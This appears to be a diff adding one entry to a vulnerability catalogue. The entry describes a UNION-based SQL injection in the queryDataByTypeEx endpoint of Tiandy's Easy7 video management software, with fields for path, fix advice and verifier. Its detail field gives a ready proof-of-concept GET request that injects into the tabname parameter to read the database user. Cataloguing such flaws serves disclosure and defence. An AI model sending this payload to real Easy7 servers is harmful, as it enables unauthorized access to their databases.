@@ -1,0 +1,10 @@
+vendor = "天地伟业 (Tiandy)"
+name = "天地伟业 Easy7 queryDataByTypeEx SQL注入漏洞"
+type = "SQL注入（联合查询注入）"
+version = "天地伟业 Easy7（受影响版本未公开）"
+path = "/Easy7/rest/workbook/queryDataByTypeEx"
+detail = "GET /Easy7/rest/workbook/queryDataByTypeEx?tabname=1'+UNION+SELECT+@@user(),1--+ HTTP/1.1 Host: target"
+fix = "接口添加认证；参数化查询"
+date = 20260615
+label = "nday"
+verifier = "AdySec"
